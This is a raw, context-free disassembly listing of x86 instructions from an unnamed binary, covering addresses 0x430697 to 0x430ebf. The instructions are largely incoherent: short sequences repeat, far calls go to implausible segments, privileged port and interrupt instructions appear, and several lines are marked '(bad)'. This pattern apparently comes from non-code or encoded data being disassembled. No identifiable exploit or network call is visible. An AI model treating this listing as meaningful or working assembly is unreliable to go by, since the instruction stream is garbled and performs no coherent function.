  430697:	xchg   esp,eax
  430698:	pop    ss
  430699:	loop   0x4306f3
  43069b:	pop    esp
  43069c:	bound  esp,QWORD PTR [edx+0x14]
  43069f:	stos   BYTE PTR es:[edi],al
  4306a0:	int3   
  4306a1:	popa   
  4306a2:	popa   
  4306a3:	xchg   esp,eax
  4306a4:	pop    ss
  4306a5:	loop   0x4306ed
  4306a7:	pop    esp
  4306a8:	bound  esp,QWORD PTR [edx+0x14]
  4306ab:	in     al,0xd3
  4306ad:	popa   
  4306ae:	popa   
  4306af:	xchg   esp,eax
  4306b0:	pop    ss
  4306b1:	loop   0x4306db
  4306b3:	pop    esp
  4306b4:	bound  esp,QWORD PTR [edx+0x14]
  4306b7:	mov    eax,ds:0x946161cc
  4306bc:	pop    ss
  4306bd:	loop   0x4306e5
  4306bf:	pop    esp
  4306c0:	bound  esp,QWORD PTR [edx+0x14]
  4306c3:	loope  0x430691
  4306c5:	popa   
  4306c6:	popa   
  4306c7:	xchg   esp,eax
  4306c8:	pop    ss
  4306c9:	loop   0x43071b
  4306cb:	pop    esp
  4306cc:	bound  esp,QWORD PTR [edx+0x14]
  4306cf:	mov    ds:0x946161cc,eax
  4306d4:	pop    ss
  4306d5:	loop   0x430715
  4306d7:	pop    esp
  4306d8:	bound  esp,QWORD PTR [edx+0x14]
  4306db:	xor    al,0xcc
  4306dd:	popa   
  4306de:	popa   
  4306df:	xchg   esp,eax
  4306e0:	pop    ss
  4306e1:	loop   0x43071f
  4306e3:	pop    esp
  4306e4:	bound  esp,QWORD PTR [edx+0x14]
  4306e7:	xchg   esi,eax
  4306e8:	int3   
  4306e9:	popa   
  4306ea:	popa   
  4306eb:	xchg   esp,eax
  4306ec:	pop    ss
  4306ed:	loop   0x430731
  4306ef:	pop    esp
  4306f0:	bound  esp,QWORD PTR [edx+0x14]
  4306f3:	imul   eax,DWORD PTR [eax],0x17946161
  4306f9:	loop   0x430743
  4306fb:	pop    esp
  4306fc:	bound  esp,QWORD PTR [edx+0x14]
  4306ff:	in     eax,0x13
  430701:	popa   
  430702:	popa   
  430703:	xchg   esp,eax
  430704:	pop    ss
  430705:	loop   0x43073d
  430707:	pop    esp
  430708:	bound  esp,QWORD PTR [edx+0x14]
  43070b:	jo     0x430733
  43070d:	popa   
  43070e:	popa   
  43070f:	xchg   esp,eax
  430710:	pop    ss
  430711:	loop   0x43072b
  430713:	pop    esp
  430714:	bound  esp,QWORD PTR [edx+0x14]
  430717:	push   cs
  430718:	push   ecx
  430719:	popa   
  43071a:	popa   
  43071b:	xchg   esp,eax
  43071c:	pop    ss
  43071d:	loop   0x430735
  43071f:	pop    esp
  430720:	bound  esp,QWORD PTR [edx+0x14]
  430723:	sbb    DWORD PTR [edx],eax
  430725:	popa   
  430726:	popa   
  430727:	xchg   esp,eax
  430728:	pop    ss
  430729:	loop   0x43071e
  43072b:	pop    esp
  43072c:	bound  esp,QWORD PTR [edx+0x14]
  43072f:	sbb    DWORD PTR [ebx+0x17946161],ebx
  430735:	loop   0x430728
  430737:	pop    esp
  430738:	bound  esp,QWORD PTR [edx+0x14]
  43073b:	pushf  
  43073c:	int3   
  43073d:	popa   
  43073e:	popa   
  43073f:	xchg   esp,eax
  430740:	pop    ss
  430741:	loop   0x4307a7
  430743:	pop    esp
  430744:	bound  esp,QWORD PTR [edx+0x14]
  430747:	jp     0x430715
  430749:	popa   
  43074a:	popa   
  43074b:	xchg   esp,eax
  43074c:	pop    ss
  43074d:	loop   0x4307c5
  43074f:	arpl   WORD PTR [edx+0x62],sp
  430752:	adc    al,0x34
  430754:	int3   
  430755:	popa   
  430756:	popa   
  430757:	xchg   esp,eax
  430758:	pop    ss
  430759:	loop   0x4307d7
  43075b:	arpl   WORD PTR [edx+0x62],sp
  43075e:	adc    al,0xe3
  430760:	int3   
  430761:	popa   
  430762:	popa   
  430763:	xchg   esp,eax
  430764:	pop    ss
  430765:	loop   0x430762
  430767:	arpl   WORD PTR [edx+0x62],sp
  43076a:	adc    al,0xaa
  43076c:	int3   
  43076d:	popa   
  43076e:	popa   
  43076f:	xchg   esp,eax
  430770:	pop    ss
  430771:	loop   0x4307eb
  430773:	arpl   WORD PTR [edx+0x62],sp
  430776:	adc    al,0xe4
  430778:	shl    DWORD PTR [ecx+0x61],cl
  43077b:	xchg   esp,eax
  43077c:	pop    ss
  43077d:	loop   0x43070d
  43077f:	arpl   WORD PTR [edx+0x62],sp
  430782:	adc    al,0xa1
  430784:	int3   
  430785:	popa   
  430786:	popa   
  430787:	xchg   esp,eax
  430788:	pop    ss
  430789:	loop   0x43075f
  43078b:	arpl   WORD PTR [edx+0x62],sp
  43078e:	adc    al,0xe6
  430790:	int3   
  430791:	popa   
  430792:	popa   
  430793:	xchg   esp,eax
  430794:	pop    ss
  430795:	loop   0x4307cf
  430797:	arpl   WORD PTR [edx+0x62],sp
  43079a:	adc    al,0xa3
  43079c:	int3   
  43079d:	popa   
  43079e:	popa   
  43079f:	xchg   esp,eax
  4307a0:	pop    ss
  4307a1:	loop   0x4307d1
  4307a3:	arpl   WORD PTR [edx+0x62],sp
  4307a6:	adc    al,0x34
  4307a8:	int3   
  4307a9:	popa   
  4307aa:	popa   
  4307ab:	xchg   esp,eax
  4307ac:	pop    ss
  4307ad:	loop   0x430755
  4307af:	arpl   WORD PTR [edx+0x62],sp
  4307b2:	adc    al,0x96
  4307b4:	int3   
  4307b5:	popa   
  4307b6:	popa   
  4307b7:	xchg   esp,eax
  4307b8:	pop    ss
  4307b9:	loop   0x4307ed
  4307bb:	arpl   WORD PTR [edx+0x62],sp
  4307be:	adc    al,0x69
  4307c0:	add    BYTE PTR [ecx+0x61],ah
  4307c3:	xchg   esp,eax
  4307c4:	pop    ss
  4307c5:	loop   0x430839
  4307c7:	arpl   WORD PTR [edx+0x62],sp
  4307ca:	adc    al,0xe5
  4307cc:	adc    esp,DWORD PTR [ecx+0x61]
  4307cf:	xchg   esp,eax
  4307d0:	pop    ss
  4307d1:	loop   0x43077b
  4307d3:	arpl   WORD PTR [edx+0x62],sp
  4307d6:	adc    al,0x70
  4307d8:	es popa 
  4307da:	popa   
  4307db:	xchg   esp,eax
  4307dc:	pop    ss
  4307dd:	loop   0x43077d
  4307df:	arpl   WORD PTR [edx+0x62],sp
  4307e2:	adc    al,0xe
  4307e4:	push   ecx
  4307e5:	popa   
  4307e6:	popa   
  4307e7:	xchg   esp,eax
  4307e8:	pop    ss
  4307e9:	loop   0x43076f
  4307eb:	arpl   WORD PTR [edx+0x62],sp
  4307ee:	adc    al,0x19
  4307f0:	add    ah,BYTE PTR [ecx+0x61]
  4307f3:	xchg   esp,eax
  4307f4:	pop    ss
  4307f5:	loop   0x4307a1
  4307f7:	arpl   WORD PTR [edx+0x62],sp
  4307fa:	adc    al,0x19
  4307fc:	fwait
  4307fd:	popa   
  4307fe:	popa   
  4307ff:	xchg   esp,eax
  430800:	pop    ss
  430801:	loop   0x4307a3
  430803:	arpl   WORD PTR [edx+0x62],sp
  430806:	adc    al,0x9c
  430808:	int3   
  430809:	popa   
  43080a:	popa   
  43080b:	xchg   esp,eax
  43080c:	pop    ss
  43080d:	loop   0x4307a5
  43080f:	arpl   WORD PTR [edx+0x62],sp
  430812:	or     eax,0xb858675
  430817:	call   0xa8e8:0x5e343ac9
  43081e:	popa   
  43081f:	pop    ss
  430820:	loop   0x430882
  430822:	pop    esp
  430823:	bound  esp,QWORD PTR [edx-0x12]
  430826:	xchg   DWORD PTR ds:0xb858675,ecx
  43082c:	call   0x5c60:0x130d3ac9
  430833:	bound  esp,QWORD PTR [edx+0x13]
  430836:	outs   dx,BYTE PTR ds:[esi]
  430837:	push   0x61a8e85e
  43083c:	pop    ss
  43083d:	loop   0x43089f
  43083f:	pop    esp
  430840:	bound  esp,QWORD PTR [edx+0xd]
  430843:	jne    0x4307cb
  430845:	test   DWORD PTR [ebx],ecx
  430847:	call   0xa873:0x56343ac9
  43084e:	popa   
  43084f:	mov    eax,ds:0x625c60e2
  430854:	bound  esi,QWORD PTR [ebx+0x75]
  430857:	or     eax,0xb858675
  43085c:	call   0xa8e8:0x5e343ac9
  430863:	popa   
  430864:	or     eax,0x625c6013
  430869:	bound  ebp,QWORD PTR ds:0x6e069360
  43086f:	lea    edi,[esi-0x7a9d9d9d]
  430875:	fsub   DWORD PTR [ecx+0x61]
  430878:	popa   
  430879:	fcomp  DWORD PTR [edx+ebx*4]
  43087c:	or     eax,0x6fd686cd
  430881:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  430887:	pop    esi
  430888:	call   0xe4506a35
  43088d:	pusha  
  43088e:	pop    esp
  43088f:	bound  esp,QWORD PTR [edx+0x2d]
  430892:	dec    edi
  430893:	add    al,0x6e
  430895:	imul   edi,DWORD PTR [esi-0x119d9d9d],0xd
  43089c:	or     eax,0xb858675
  4308a1:	call   0xa8e8:0x5e343ac9
  4308a8:	popa   
  4308a9:	pop    ss
  4308aa:	loop   0x4308c0
  4308ac:	arpl   WORD PTR [edx+0x62],sp
  4308af:	or     eax,0xb859a75
  4308b4:	call   0x63be:0x13133ac9
  4308bb:	bound  esp,QWORD PTR [edx+0x17]
  4308be:	adc    dl,ah
  4308c0:	and    al,0x4e
  4308c2:	push   edi
  4308c3:	popa   
  4308c4:	fcomp  DWORD PTR [ebx+0x31]
  4308c7:	pop    esp
  4308c8:	bound  esp,QWORD PTR [edx+0x61]
  4308cb:	adc    al,0x71
  4308cd:	int3   
  4308ce:	popa   
  4308cf:	popa   
  4308d0:	xchg   esp,eax
  4308d1:	pop    ss
  4308d2:	loop   0x430931
  4308d4:	pop    esp
  4308d5:	bound  esp,QWORD PTR [edx+0x14]
  4308d8:	(bad)
  4308db:	popa   
  4308dc:	xchg   esp,eax
  4308dd:	pop    ss
  4308de:	loop   0x43092b
  4308e0:	pop    esp
  4308e1:	bound  esp,QWORD PTR [edx+0x14]
  4308e4:	pop    es
  4308e5:	shl    DWORD PTR [ecx+0x61],cl
  4308e8:	xchg   esp,eax
  4308e9:	pop    ss
  4308ea:	loop   0x430955
  4308ec:	pop    esp
  4308ed:	bound  esp,QWORD PTR [edx+0x14]
  4308f0:	out    dx,eax
  4308f1:	shl    DWORD PTR [ecx+0x61],cl
  4308f4:	xchg   esp,eax
  4308f5:	pop    ss
  4308f6:	loop   0x43095f
  4308f8:	pop    esp
  4308f9:	bound  esp,QWORD PTR [edx+0x14]
  4308fc:	jmp    0x94a46ad4
  430901:	pop    ss
  430902:	loop   0x430959
  430904:	pop    esp
  430905:	bound  esp,QWORD PTR [edx+0x14]
  430908:	or     eax,0x946161d3
  43090d:	pop    ss
  43090e:	loop   0x430973
  430910:	pop    esp
  430911:	bound  esp,QWORD PTR [edx+0x14]
  430914:	(bad)  
  430916:	popa   
  430917:	popa   
  430918:	xchg   esp,eax
  430919:	pop    ss
  43091a:	loop   0x43097d
  43091c:	arpl   WORD PTR [edx+0x62],sp
  43091f:	adc    al,0x71
  430921:	int3   
  430922:	popa   
  430923:	popa   
  430924:	xchg   esp,eax
  430925:	pop    ss
  430926:	loop   0x430987
  430928:	arpl   WORD PTR [edx+0x62],sp
  43092b:	adc    al,0x34
  43092d:	int3   
  43092e:	popa   
  43092f:	popa   
  430930:	xchg   esp,eax
  430931:	pop    ss
  430932:	loop   0x43092b
  430934:	arpl   WORD PTR [edx+0x62],sp
  430937:	adc    al,0x13
  430939:	shl    DWORD PTR [ecx+0x61],cl
  43093c:	xchg   esp,eax
  43093d:	pop    ss
  43093e:	loop   0x4308e2
  430940:	arpl   WORD PTR [edx+0x62],sp
  430943:	adc    al,0xc5
  430945:	int3   
  430946:	popa   
  430947:	popa   
  430948:	xchg   esp,eax
  430949:	pop    ss
  43094a:	loop   0x4308e4
  43094c:	arpl   WORD PTR [edx+0x62],sp
  43094f:	adc    al,0xdd
  430951:	int3   
  430952:	popa   
  430953:	popa   
  430954:	xchg   esp,eax
  430955:	pop    ss
  430956:	loop   0x430984
  430958:	arpl   WORD PTR [edx+0x62],sp
  43095b:	adc    al,0xc5
  43095d:	int3   
  43095e:	popa   
  43095f:	popa   
  430960:	xchg   esp,eax
  430961:	pop    ss
  430962:	loop   0x4309d8
  430964:	arpl   WORD PTR [edx+0x62],sp
  430967:	adc    al,0xe7
  430969:	int3   
  43096a:	popa   
  43096b:	popa   
  43096c:	xchg   esp,eax
  43096d:	pop    ss
  43096e:	loop   0x43094a
  430970:	arpl   WORD PTR [edx+0x62],sp
  430973:	adc    al,0x7b
  430975:	int3   
  430976:	popa   
  430977:	popa   
  430978:	xchg   esp,eax
  430979:	pop    ss
  43097a:	loop   0x43094c
  43097c:	arpl   WORD PTR [edx+0x62],sp
  43097f:	adc    al,0xb8
  430981:	int3   
  430982:	popa   
  430983:	popa   
  430984:	xchg   esp,eax
  430985:	pop    ss
  430986:	loop   0x43094e
  430988:	arpl   WORD PTR [edx+0x62],sp
  43098b:	adc    al,0x13
  43098d:	shl    DWORD PTR [ecx+0x61],cl
  430990:	xchg   esp,eax
  430991:	pop    ss
  430992:	loop   0x430960
  430994:	arpl   WORD PTR [edx+0x62],sp
  430997:	adc    al,0x34
  430999:	int3   
  43099a:	popa   
  43099b:	popa   
  43099c:	xchg   esp,eax
  43099d:	pop    ss
  43099e:	loop   0x430972
  4309a0:	arpl   WORD PTR [edx+0x62],sp
  4309a3:	or     eax,0xb859a75
  4309a8:	call   0x8475:0x6e133ac9
  4309af:	sbb    dh,cl
  4309b1:	popa   
  4309b2:	pop    ss
  4309b3:	loop   0x4309d1
  4309b5:	pop    esp
  4309b6:	bound  esp,QWORD PTR [edx+0xd]
  4309b9:	jne    0x430955
  4309bb:	test   DWORD PTR [ebx],ecx
  4309bd:	call   0xa8e8:0x5e343ac9
  4309c4:	popa   
  4309c5:	or     eax,0x625c1c13
  4309ca:	bound  edx,QWORD PTR [ebx+0x60af91f2]
  4309d0:	or     eax,0x625c1ce2
  4309d5:	bound  edx,QWORD PTR [edi+edx*1-0x658af266]
  4309dc:	test   DWORD PTR [ebx],ecx
  4309de:	call   0xf175:0x6e133ac9
  4309e5:	xor    eax,0xe21761ce
  4309ea:	and    BYTE PTR [edx+eiz*2+0x62],bl
  4309ee:	or     eax,0xb859a75
  4309f3:	call   0xa8e8:0x5e343ac9
  4309fa:	popa   
  4309fb:	or     eax,0x625c2013
  430a00:	bound  edx,QWORD PTR [ebx+0x60af91f2]
  430a06:	or     eax,0x625c20e2
  430a0b:	bound  edx,QWORD PTR [edi+edx*1-0x658af266]
  430a12:	test   DWORD PTR [ebx],ecx
  430a14:	call   0xa8e8:0x5e343ac9
  430a1b:	popa   
  430a1c:	or     eax,0x6fd69acd
  430a21:	or     ebx,DWORD PTR [edx+0x17943ac9]
  430a27:	outs   dx,BYTE PTR ds:[esi]
  430a28:	int    0xc8
  430a2a:	sbb    dh,cl
  430a2c:	popa   
  430a2d:	or     eax,0xb859a75
  430a32:	call   0xa8e8:0x5e343ac9
  430a39:	popa   
  430a3a:	or     eax,0x6fd69acd
  430a3f:	or     ebx,DWORD PTR [edx+0x17943ac9]
  430a45:	outs   dx,BYTE PTR ds:[esi]
  430a46:	int    0x63
  430a48:	xor    eax,0x750d61ce
  430a4d:	xchg   BYTE PTR [ebp+0x3ac99a0b],al
  430a53:	or     eax,0x6fd686cd
  430a58:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  430a5e:	call   0xe217:0x61ce1b4b
  430a65:	adc    al,0x63
  430a67:	bound  esp,QWORD PTR [edx+0xd]
  430a6a:	jne    0x430a06
  430a6c:	test   DWORD PTR [ebx],ecx
  430a6e:	call   0x63b6:0x13133ac9
  430a75:	bound  esp,QWORD PTR [edx+0x17]
  430a78:	adc    dl,ah
  430a7a:	and    al,0x4e
  430a7c:	push   edi
  430a7d:	popa   
  430a7e:	jo     0x430ae1
  430a80:	bound  esi,QWORD PTR [edx-0x5d1dec72]
  430a86:	arpl   WORD PTR [edx+0x62],sp
  430a89:	shl    bl,cl
  430a8b:	jp     0x430a55
  430a8d:	popa   
  430a8e:	popa   
  430a8f:	or     eax,0x6fd686cd
  430a94:	or     ebx,DWORD PTR [edx+0x6e173ac9]
  430a9a:	adc    esp,DWORD PTR [esi+ecx*2]
  430a9d:	push   edi
  430a9e:	popa   
  430a9f:	or     eax,0xb859a75
  430aa4:	call   0xa8e8:0x5e343ac9
  430aab:	popa   
  430aac:	mov    eax,ds:0x625c31e2
  430ab1:	(bad)  
  430ab2:	out    0x2,eax
  430ab4:	adc    esp,edx
  430ab6:	adc    al,0x63
  430ab8:	bound  esp,QWORD PTR [edx-0x2e]
  430abb:	or     eax,0xb858675
  430ac0:	call   0xa8e8:0x5e343ac9
  430ac7:	popa   
  430ac8:	rcl    BYTE PTR [ebx],cl
  430aca:	loop   0x430b42
  430acc:	arpl   WORD PTR [edx+0x62],sp
  430acf:	shl    BYTE PTR [edx+0xb],cl
  430ad2:	xor    DWORD PTR [edx+eiz*2+0x62],ebx
  430ad6:	or     eax,0x58629275
  430adb:	or     eax,0xb859a75
  430ae0:	call   0x639a:0x13133ac9
  430ae7:	bound  esp,QWORD PTR [edx+0x17]
  430aea:	adc    dl,ah
  430aec:	and    al,0x4e
  430aee:	push   edi
  430aef:	popa   
  430af0:	jo     0x430b53
  430af2:	bound  esi,QWORD PTR [edx+0x5de2138e]
  430af8:	pop    esp
  430af9:	bound  esp,QWORD PTR [edx-0x2e]
  430afc:	repz dec ebx
  430afe:	leave  
  430aff:	popa   
  430b00:	popa   
  430b01:	or     eax,0x6fd686cd
  430b06:	or     ebx,DWORD PTR [edx+0x6e173ac9]
  430b0c:	adc    esp,DWORD PTR [esi+ecx*2]
  430b0f:	push   edi
  430b10:	popa   
  430b11:	adc    esp,edx
  430b13:	fbld   TBYTE PTR [edx+0x62]
  430b16:	bound  edx,QWORD PTR [edi]
  430b18:	loop   0x430b22
  430b1a:	arpl   WORD PTR [edx+0x62],sp
  430b1d:	bound  ecx,QWORD PTR [ebx]
  430b1f:	out    0x62,eax
  430b21:	bound  esp,QWORD PTR [edx+0x62]
  430b24:	mov    dl,0xfb
  430b26:	bound  esi,QWORD PTR [edx-0x754d9d8a]
  430b2c:	bound  esi,QWORD PTR [edx-0x6d4d9d82]
  430b32:	bound  esi,QWORD PTR [edx-0x794d9d66]
  430b38:	repz dec ebx
  430b3a:	xor    esp,DWORD PTR [ecx+0x61]
  430b3d:	or     eax,0x62630813
  430b42:	bound  edx,QWORD PTR [edi]
  430b44:	push   0x859a750d
  430b49:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  430b4f:	call   0xe2ea6cfc
  430b54:	fbld   TBYTE PTR [edx+0x62]
  430b57:	bound  edx,QWORD PTR [ebx+0x61610e6e]
  430b5d:	popa   
  430b5e:	adc    esi,DWORD PTR [ebp-0x9]
  430b61:	pop    ss
  430b62:	loop   0x430b5d
  430b64:	pop    esp
  430b65:	bound  esp,QWORD PTR [edx+0xd]
  430b68:	loop   0x430b51
  430b6a:	bound  esp,QWORD PTR [edx+0x62]
  430b6d:	push   esi
  430b6e:	loop   0x430b4f
  430b70:	bound  esp,QWORD PTR [edx+0x62]
  430b73:	pop    ss
  430b74:	loop   0x430b5d
  430b76:	bound  esp,QWORD PTR [edx+0x62]
  430b79:	bound  ecx,QWORD PTR [ebx]
  430b7b:	out    0x62,eax
  430b7d:	bound  esp,QWORD PTR [edx-0xd]
  430b80:	aaa    
  430b81:	cmp    ah,BYTE PTR [ecx+0x61]
  430b84:	or     eax,0xb859a75
  430b89:	call   0xa8e8:0x5e343ac9
  430b90:	popa   
  430b91:	or     eax,0x6262e713
  430b96:	bound  ecx,QWORD PTR ds:0x61686017
  430b9c:	popa   
  430b9d:	or     eax,0xb6fd691
  430ba2:	call   0xe85e:0x1fd63ac9
  430ba9:	test   al,0x61
  430bab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430bac:	pop    ds
  430bad:	mov    dl,0x83
  430baf:	or     eax,0x6262e7e2
  430bb4:	bound  ecx,QWORD PTR ds:0x61684cdb
  430bba:	popa   
  430bbb:	bound  esi,QWORD PTR [edx+0xd]
  430bbe:	loop   0x430ba7
  430bc0:	bound  esp,QWORD PTR [edx+0x62]
  430bc3:	or     eax,0x616848db
  430bc8:	popa   
  430bc9:	(bad)  
  430bcb:	cmp    dh,ch
  430bcd:	jl     0x430bdc
  430bcf:	loop   0x430bb8
  430bd1:	bound  esp,QWORD PTR [edx+0x62]
  430bd4:	or     eax,0x6168dfdb
  430bd9:	popa   
  430bda:	or     eax,0x625cf913
  430bdf:	bound  ecx,QWORD PTR ds:0xd9a5691
  430be5:	loop   0x430be0
  430be7:	pop    esp
  430be8:	bound  esp,QWORD PTR [edx+0x17]
  430beb:	call   0x6262:0x62e7e20d
  430bf2:	xor    al,0x3c
  430bf4:	push   0xe2176161
  430bf9:	adc    al,0x5c
  430bfb:	bound  esp,QWORD PTR [edx+0xd]
  430bfe:	loop   0x430c14
  430c00:	pop    esp
  430c01:	bound  esp,QWORD PTR [edx+0xd]
  430c04:	popa   
  430c05:	or     eax,0xe217da61
  430c0a:	or     BYTE PTR [edx+eiz*2+0x62],bl
  430c0e:	or     eax,0x625c14e2
  430c13:	bound  ecx,QWORD PTR ds:0x8130d61
  430c19:	pop    esp
  430c1a:	bound  esp,QWORD PTR [edx+0x17]
  430c1d:	call   0x6262:0x62e7e20d
  430c24:	or     eax,0x616850db
  430c29:	popa   
  430c2a:	or     eax,0x625c0813
  430c2f:	bound  edx,QWORD PTR [ebx]
  430c31:	test   DWORD PTR [edi+edx*1],0x625cade2
  430c38:	bound  ecx,QWORD PTR ds:0x625cade2
  430c3e:	bound  ecx,QWORD PTR ds:0xe7130d61
  430c44:	bound  esp,QWORD PTR [edx+0x62]
  430c47:	or     eax,0x6168df17
  430c4c:	popa   
  430c4d:	or     eax,0xd685661
  430c52:	adc    ebp,DWORD PTR [ebp+0xd62625c]
  430c58:	xchg   ecx,eax
  430c59:	pop    ss
  430c5a:	push   0x61fb2257
  430c5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430c60:	or     eax,0xc664d864
  430c65:	and    DWORD PTR [ebp+0x55],esi
  430c68:	lods   eax,DWORD PTR ds:[esi]
  430c69:	loop   0x430c6c
  430c6b:	imul   esp,DWORD PTR [ecx],0xe2256975
  430c71:	add    DWORD PTR [ecx+0xd],ebp
  430c74:	jne    0x430c10
  430c76:	or     eax,0x6fd655cd
  430c7b:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  430c81:	pop    esi
  430c82:	call   0x1fea6e2f
  430c87:	mov    dl,0x8b
  430c89:	or     eax,0xb855575
  430c8e:	call   0xa8e8:0x5e343ac9
  430c95:	popa   
  430c96:	lock aad 0x5f
  430c99:	popa   
  430c9a:	popa   
  430c9b:	lock (bad) 
  430c9d:	pop    edi
  430c9e:	popa   
  430c9f:	popa   
  430ca0:	or     eax,0xcd0d8675
  430ca5:	push   ebp
  430ca6:	(bad)  
  430ca7:	outs   dx,DWORD PTR ds:[esi]
  430ca8:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  430cae:	pop    esi
  430caf:	call   0x1fea6e5c
  430cb4:	xchg   ebx,eax
  430cb5:	outs   dx,BYTE PTR ds:[esi]
  430cb6:	icebp  
  430cb7:	push   0x750d6161
  430cbc:	xchg   edx,eax
  430cbd:	pop    ss
  430cbe:	jne    0x430cc8
  430cc0:	or     eax,0x75178675
  430cc5:	adc    al,0xd
  430cc7:	jne    0x430c63
  430cc9:	pop    ss
  430cca:	jne    0x430cec
  430ccc:	and    DWORD PTR [ebp-0xd],esi
  430ccf:	add    ah,dl
  430cd1:	add    DWORD PTR [ecx+0x21],ebp
  430cd4:	jne    0x430d07
  430cd6:	and    esp,edx
  430cd8:	add    DWORD PTR [ecx+0x21],ebp
  430cdb:	jne    0x430d25
  430cdd:	lods   eax,DWORD PTR ds:[esi]
  430cde:	loop   0x430ce1
  430ce0:	imul   esp,DWORD PTR [ecx],0xe2253c75
  430ce6:	add    DWORD PTR [ecx+0x21],ebp
  430ce9:	jne    0x430d48
  430ceb:	mov    bl,0xe2
  430ced:	add    DWORD PTR [ecx+0xd],ebp
  430cf0:	jne    0x430d2e
  430cf2:	test   DWORD PTR [ebx],ecx
  430cf4:	call   0xa8e8:0x5e343ac9
  430cfb:	popa   
  430cfc:	or     eax,0x602d14cd
  430d01:	pop    ss
  430d02:	int    0x64
  430d04:	and    DWORD PTR [ebp+0x18],esi
  430d07:	sub    edx,esp
  430d09:	add    DWORD PTR [ecx-0x2a],ebp
  430d0c:	jmp    0x9369:0x1e2ad5d
  430d13:	outs   dx,BYTE PTR ds:[esi]
  430d14:	sbb    ch,BYTE PTR [eax+0x61]
  430d17:	popa   
  430d18:	or     eax,0xb853c75
  430d1d:	call   0xd63c:0xcd0d3ac9
  430d24:	outs   dx,DWORD PTR ds:[esi]
  430d25:	or     ebx,DWORD PTR [edx+0x10133ac9]
  430d2b:	call   0x750d:0x61ce1b4b
  430d32:	fs scas eax,DWORD PTR es:[edi]
  430d34:	inc    esi
  430d35:	dec    edx
  430d36:	outs   dx,DWORD PTR ds:[esi]
  430d37:	or     eax,0xb855d75
  430d3c:	call   0xa8e8:0x5e343ac9
  430d43:	popa   
  430d44:	or     eax,0x6fd63ccd
  430d49:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  430d4f:	pop    esi
  430d50:	call   0x1f706efd
  430d55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430d56:	pop    eax
  430d57:	xchg   ebx,eax
  430d58:	loop   0x430dab
  430d5a:	popa   
  430d5b:	popa   
  430d5c:	popa   
  430d5d:	or     eax,0x75562075
  430d62:	sbb    ah,BYTE PTR fs:[ecx+0x4]
  430d66:	jne    0x430d89
  430d68:	or     eax,0xb854875
  430d6d:	call   0xa8e8:0x5e343ac9
  430d74:	popa   
  430d75:	pop    ss
  430d76:	jne    0x430d94
  430d78:	out    dx,al
  430d79:	cmp    cl,BYTE PTR ds:0x17a21c75
  430d7f:	jne    0x430d9d
  430d81:	or     eax,0xb851875
  430d86:	call   0xa8e8:0x5e343ac9
  430d8d:	popa   
  430d8e:	mov    eax,ds:0xd2731c75
  430d93:	or     eax,0x5e331c75
  430d98:	call   0xbc86f45
  430d9d:	call   0xa550:0x66343ac9
  430da4:	fmul   QWORD PTR ds:0x2c171ccd
  430daa:	adc    esp,DWORD PTR [eax+0xd]
  430dad:	jne    0x430dcb
  430daf:	(bad)  
  430db0:	(bad)  
  430db2:	pusha  
  430db3:	cld    
  430db4:	dec    ebp
  430db5:	int3   
  430db6:	mov    es,ebp
  430db8:	imul   ecx,DWORD PTR ds:0x2c0d1c75,0xffffffe2
  430dbf:	pusha  
  430dc0:	xor    al,0x3c
  430dc2:	push   ebp
  430dc3:	xor    al,0xf7
  430dc5:	or     eax,0x2c171ccd
  430dca:	adc    esp,DWORD PTR [eax-0x12]
  430dcd:	(bad)  
  430dce:	or     eax,0x2c0d1c75
  430dd3:	loop   0x430e35
  430dd5:	xor    edi,DWORD PTR [eax+eiz*1]
  430dd8:	rcr    BYTE PTR [edi+0xd],cl
  430ddb:	int    0x1c
  430ddd:	pop    ss
  430dde:	sub    al,0x13
  430de0:	pusha  
  430de1:	out    dx,al
  430de2:	adc    eax,ebx
  430de4:	jmp    0x693:0x89b26108
  430deb:	jne    0x430e0e
  430ded:	test   eax,ebx
  430def:	popa   
  430df0:	popa   
  430df1:	popa   
  430df2:	fcomp  DWORD PTR [edx+ebx*4]
  430df5:	add    al,0x75
  430df7:	and    esi,ebp
  430df9:	xor    ecx,DWORD PTR ds:0xb85f375
  430dff:	call   0xa8e8:0x5e343ac9
  430e06:	popa   
  430e07:	xchg   ebx,eax
  430e08:	push   es
  430e09:	int    0x21
  430e0b:	sub    eax,0x21cd0460
  430e10:	or     eax,0x6fd631cd
  430e15:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  430e1b:	pop    esi
  430e1c:	call   0x755d6fc9
  430e21:	and    DWORD PTR [esi+0x60],eax
  430e24:	add    al,0x75
  430e26:	and    DWORD PTR [edi+0x20750d1c],ebp
  430e2c:	push   esi
  430e2d:	jne    0x430e93
  430e2f:	sbb    cl,ch
  430e31:	and    DWORD PTR [edx+ebx*4],eax
  430e34:	or     eax,0x5e336475
  430e39:	call   0xbc86fe6
  430e3e:	call   0xb248:0x75a73ac9
  430e45:	cwde   
  430e46:	or     eax,0xb855d75
  430e4b:	call   0xa8e8:0x5e343ac9
  430e52:	popa   
  430e53:	or     eax,0x6fd63ccd
  430e58:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  430e5e:	pop    esi
  430e5f:	call   0x1f70700c
  430e64:	xor    ebx,DWORD PTR [esi-0x18]
  430e67:	test   al,0x61
  430e69:	test   DWORD PTR [ebx],ecx
  430e6b:	call   0xd5d:0x75173ac9
  430e72:	jne    0x430eb0
  430e74:	test   DWORD PTR [ebx],ecx
  430e76:	call   0xa8e8:0x5e343ac9
  430e7d:	popa   
  430e7e:	or     eax,0x602d14cd
  430e83:	pop    ss
  430e84:	int    0x64
  430e86:	out    dx,al
  430e87:	imul   ecx,DWORD PTR ds:0xb853c75,0xffffff9a
  430e8e:	leave  
  430e8f:	cmp    dh,BYTE PTR [esi+ebx*2]
  430e92:	call   0xcd50703f
  430e97:	fs sub eax,0x64cd1760
  430e9d:	lock in eax,0x63
  430ea0:	bound  esp,QWORD PTR [edx-0x12]
  430ea3:	xchg   ebx,eax
  430ea4:	or     eax,0xb855575
  430ea9:	call   0xa8e8:0x5e343ac9
  430eb0:	popa   
  430eb1:	out    dx,al
  430eb2:	lea    ecx,ds:0xb856975
  430eb8:	call   0xa8e8:0x5e343ac9
  430ebf:	popa   
